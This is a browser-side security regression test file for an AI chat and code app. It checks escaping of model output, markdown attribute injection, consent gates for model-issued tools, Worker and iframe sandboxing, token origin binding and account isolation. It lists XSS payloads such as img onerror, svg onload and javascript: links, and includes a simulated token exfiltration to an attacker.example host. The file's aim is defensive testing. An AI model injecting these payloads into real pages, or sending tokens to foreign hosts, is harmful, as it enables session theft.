/* Security. These are the tests that must NEVER go red.
   Each one corresponds to a real vulnerability class, not a hypothetical. */
import { bootApp } from '../lib/harness.mjs';
import { ok, section, report, done } from '../lib/assert.mjs';

const app = await bootApp();
const { page, errors } = app;

/* ── XSS through model output ─────────────────────────────────────────────
   Everything the model returns is untrusted. md() must escape before it
   tokenizes, or a reply containing an <img onerror> owns the page. */
section('XSS: model output cannot execute');

const payloads = [
  '<img src=x onerror="window.__xss=1">',
  '<script>window.__xss=1<\/script>',
  '<svg onload="window.__xss=1">',
  '[click](javascript:window.__xss=1)',
  '`<img src=x onerror="window.__xss=1">`',
  '```\n<img src=x onerror="window.__xss=1">\n```',
  '<iframe srcdoc="<script>parent.__xss=1<\/script>">',
  '<a href="javascript:window.__xss=1">x</a>',
  // AMV-004: attribute injection through markdown link/image syntax
  '![x" onerror="window.__xss=1](https://e.com/i.png)',
  '[click](https://e.com/" onmouseover="window.__xss=1)',
];

const xss = await page.evaluate(async (payloads) => {
  window.__xss = 0;
  const dialogs = [];
  window.alert = () => dialogs.push('alert');
  const m = getMsgs();
  for (const p of payloads) m.push({ r: 'a', c: p, _t: Date.now() });
  renderChatMsgs();
  await new Promise(r => setTimeout(r, 400));
  return { xss: window.__xss, dialogs: dialogs.length };
}, payloads);

ok(xss.xss === 0, 'no payload executed (window.__xss === 0)', xss.xss);
ok(xss.dialogs === 0, 'no dialogs triggered', xss.dialogs);

/* Lab's syntax highlighter builds HTML from user code — it must escape FIRST. */
const labXss = await page.evaluate(() => {
  window.__xss2 = 0;
  const html = _labHL('<img src=x onerror="window.__xss2=1">', 'js');
  const d = document.createElement('div');
  d.innerHTML = html;
  document.body.appendChild(d);
  const leaked = d.querySelector('img[onerror]');
  d.remove();
  return { leaked: !!leaked, escaped: html.includes('&lt;') };
});
ok(!labXss.leaked, 'Lab highlighter does not emit live HTML from code');
ok(labXss.escaped, 'Lab highlighter escapes before tokenizing');

/* ── AMV-004: markdown attribute injection ─────────────────────────────────
   md() drops link/image URLs and alt text into "-quoted attributes. A quote in
   the alt or URL must not close the attribute and add an inline event handler
   (onerror/onmouseover) that would read tokens from localStorage. */
section('XSS: markdown attribute injection (AMV-004)');
const mdAttr = await page.evaluate(() => {
  const out = md('![x" onerror="window.__mx=1](https://e.com/i.png)')
            + md('[click](https://e.com/" onmouseover="window.__mx=1)');
  const d = document.createElement('div');
  d.innerHTML = out;
  document.body.appendChild(d);
  const img = d.querySelector('img'), a = d.querySelector('a');
  const res = {
    imgOnerror: img ? img.hasAttribute('onerror') : 'no-img',
    aOnmouseover: a ? a.hasAttribute('onmouseover') : 'no-a',
    rendered: !!img && !!a,
    escaped: /&quot;/.test(out),
  };
  d.remove();
  return res;
});
ok(mdAttr.imgOnerror === false, 'md image alt cannot inject an onerror attribute', mdAttr.imgOnerror);
ok(mdAttr.aOnmouseover === false, 'md link URL cannot inject an onmouseover attribute', mdAttr.aOnmouseover);
ok(mdAttr.rendered, 'legitimate image and link still render');
ok(mdAttr.escaped, 'attribute-breaking quotes are entity-escaped');

/* ── AMV-007: model-driven high-impact tools require user consent ───────────
   A tool call the MODEL emits may come from prompt injection or untrusted
   content. Side-effecting / code-executing tools must get explicit user
   approval on the agentic path before they run. */
section('AMV-007: model-driven side-effect tools require consent');
const consent = await page.evaluate(async () => {
  const cls = {
    deploy_site: _toolNeedsConsent('deploy_site'),
    run_code: _toolNeedsConsent('run_code'),
    fix_code: _toolNeedsConsent('fix_code'),
    generate_image: _toolNeedsConsent('generate_image'),
    generate_video: _toolNeedsConsent('generate_video'),
  };
  const orig = window._showModalAsync;
  const race = (p) => Promise.race([p, new Promise(r => setTimeout(() => r('HANG'), 3000))]);
  window._showModalAsync = async () => null;             // user clicks Deny / closes
  const denied = await race(_confirmModelTool('deploy_site', { title: 'x' }));
  window._showModalAsync = async () => true;             // user clicks Allow
  const allowed = await race(_confirmModelTool('deploy_site', { title: 'x' }));
  window._showModalAsync = orig;
  const wired = /_toolNeedsConsent/.test(_callAI.toString());
  return { cls, denied, allowed, wired };
});
ok(consent.cls.deploy_site && consent.cls.run_code && consent.cls.fix_code, 'deploy/run/fix are consent-gated');
ok(!consent.cls.generate_image && !consent.cls.generate_video, 'benign content tools are not gated');
ok(consent.denied === false, 'denying the approval blocks the tool');
ok(consent.allowed === true, 'approving the tool lets it proceed');
ok(consent.wired, 'the agentic dispatch actually consults the consent gate');

/* ── AMV-006: Python runs in an isolated Worker (no DOM / no localStorage) ──
   Pyodide's js bridge exposes the host globalThis. On the main thread that is
   the page (document, localStorage, tokens). In a Worker it is the worker scope,
   which has neither — so untrusted Python cannot read tokens or touch the DOM. */
section('AMV-006: Python executes in a Worker sandbox, not the page');
const pyiso = await page.evaluate(async () => {
  const src = (typeof _pyWorkerSource === 'function') ? _pyWorkerSource() : '';
  const out = {
    routesToWorker: /_runPythonInWorker/.test(runCode.toString()),
    noMainThread: (typeof _ensurePyodide === 'undefined'),
    srcDomFree: !/document|localStorage/.test(src),
    srcLoadsPy: /importScripts|loadPyodide/.test(src),
  };
  const RealWorker = window.Worker;
  let posted = null;
  window.Worker = class { addEventListener(t, f) { if (t === 'message') this._h = f; } removeEventListener() {} postMessage(m) { posted = m; setTimeout(() => this._h && this._h({ data: { id: m.id, ok: true, stdout: '42', stderr: '', result: '42' } }), 0); } terminate() {} };
  const r = await runCode('print(6*7)', 'python');
  window.Worker = RealWorker;
  out.ranInWorker = !!posted && posted.code === 'print(6*7)';
  out.output = r && r.stdout;
  return out;
});
ok(pyiso.routesToWorker, 'runCode routes Python through the Worker sandbox');
ok(pyiso.noMainThread, 'the main-thread Pyodide execution path is gone');
ok(pyiso.srcDomFree, 'the Worker sandbox has no document/localStorage access');
ok(pyiso.srcLoadsPy, 'the Worker sandbox loads the Python runtime');
ok(pyiso.ranInWorker, 'Python is executed inside the Worker, not on the page');
ok(pyiso.output === '42', 'Python output is returned from the Worker');

/* ── AMV-013: the bearer token is bound to the origin that issued it ────────
   Swapping the API base to an attacker origin must NOT leak the token. */
section('AMV-013: bearer token cannot be exfiltrated via a swapped API base');
const exfil = await page.evaluate(async () => {
  const captured = [];
  const realFetch = window.fetch;
  window.fetch = async (url, opts) => {
    captured.push({ url: String(url), auth: (opts && opts.headers && opts.headers['Authorization']) || null });
    return { status: 200, ok: true, json: async () => ({}), headers: { get: () => null } };
  };
  AMV_API.base = 'https://good.example';
  AMV_API._setTokens({ token: 'tok-abc', refreshToken: 'ref-abc' });
  await AMV_API._fetch('/v1/thing', { method: 'POST', body: '{}' });
  const toGood = captured[captured.length - 1];
  AMV_API.base = 'https://attacker.example';           // silent origin swap
  await AMV_API._fetch('/v1/thing', { method: 'POST', body: '{}' });
  const toAttacker = captured[captured.length - 1];
  AMV_API.base = 'http://plain.example';               // non-https must be refused
  const baseAfterHttp = AMV_API.base;
  window.fetch = realFetch;
  try { AMV_API.base = 'https://good.example'; } catch (e) {}
  return { goodAuth: toGood.auth, attackerAuth: toAttacker.auth, baseAfterHttp };
});
ok(exfil.goodAuth === 'Bearer tok-abc', 'token IS sent to the origin that issued it', exfil.goodAuth);
ok(!exfil.attackerAuth, 'token is NOT attached after the API base is swapped', exfil.attackerAuth);
ok(exfil.baseAfterHttp !== 'http://plain.example', 'a non-https backend URL is refused', exfil.baseAfterHttp);

/* ── Sandboxing: generated apps run with no same-origin access ─────────────
   A generated app is untrusted code. It must render in an iframe WITHOUT
   allow-same-origin, or it could read AMV's storage and steal the API token. */
section('Sandboxing: generated code cannot reach AMV');

const frames = await page.evaluate(async () => {
  // run_code(html) genuinely renders untrusted HTML — that's the real path.
  const runOut = await _amvRunTool('run_code', { code: '<h1>hi</h1>', lang: 'html' });

  // mount it, exactly as chat would
  const host = document.createElement('div');
  host.innerHTML = runOut.render || '';
  document.body.appendChild(host);
  await new Promise(r => setTimeout(r, 250));

  const live = [...document.querySelectorAll('iframe')].map(f => f.getAttribute('sandbox'));
  const fromTool = (runOut.render || '').match(/sandbox="([^"]*)"/);
  host.remove();

  return {
    live,
    toolSandbox: fromTool ? fromTool[1] : null,
    toolMakesIframe: (runOut.render || '').includes('<iframe')
  };
});

ok(frames.toolMakesIframe, 'run_code(html) renders in an iframe');
ok(frames.toolSandbox !== null, 'that iframe has a sandbox attribute', frames.toolSandbox);
ok(!(frames.toolSandbox || '').includes('allow-same-origin'),
   'it does NOT grant allow-same-origin (cannot read AMV storage/token)', frames.toolSandbox);

ok(frames.live.length > 0, `${frames.live.length} live iframe(s) present to check`, frames.live);
frames.live.forEach((sb, i) => {
  ok(sb !== null, `live iframe ${i} is sandboxed`, sb);
  ok(!(sb || '').includes('allow-same-origin'),
     `live iframe ${i} does NOT grant allow-same-origin`, sb);
});

/* ── Account isolation: signing in as B must not expose A's work ─────────── */
section('Account isolation: one user cannot see another"s data');

const iso = await page.evaluate(async () => {
  // NOTE: store()/load() route through _scopeKey(), which namespaces every key
  // per account. That scoping IS the isolation mechanism being tested here.
  // Alice does work
  S.user = { name: 'Alice', email: 'alice@test.com', ini: 'A' };
  _wipeAccountState();
  S.convs = [{ id: 'c1', title: 'ALICE SECRET PROJECT', msgs: [{ r: 'u', c: 'secret' }] }];
  store('amv_convs', S.convs);
  _SESSIONS.length = 0;
  _SESSIONS.push({ id: 's1', kind: 'dev', title: 'ALICE private code', updated: Date.now(), state: {} });
  _persistSessions();

  // Bob signs in
  S.user = { name: 'Bob', email: 'bob@test.com', ini: 'B' };
  _wipeAccountState();
  _loadSessions();
  const bobSees = {
    convs: (load('amv_convs') || []).map(c => c.title),
    sessions: (_SESSIONS || []).map(s => s.title)
  };

  // Alice comes back — her work must still be there
  S.user = { name: 'Alice', email: 'alice@test.com', ini: 'A' };
  _wipeAccountState();
  _loadSessions();
  const aliceSees = {
    convs: (load('amv_convs') || []).map(c => c.title),
    sessions: (_SESSIONS || []).map(s => s.title)
  };
  return { bobSees, aliceSees };
});

ok(!JSON.stringify(iso.bobSees).includes('ALICE'),
   'Bob sees NONE of Alice"s chats or projects', iso.bobSees);
ok(JSON.stringify(iso.aliceSees).includes('ALICE'),
   'Alice"s work is intact when she returns', iso.aliceSees);

section('No JavaScript errors');
ok(errors.length === 0, 'zero uncaught page errors', errors.slice(0, 3));

await app.close();
report();
done();
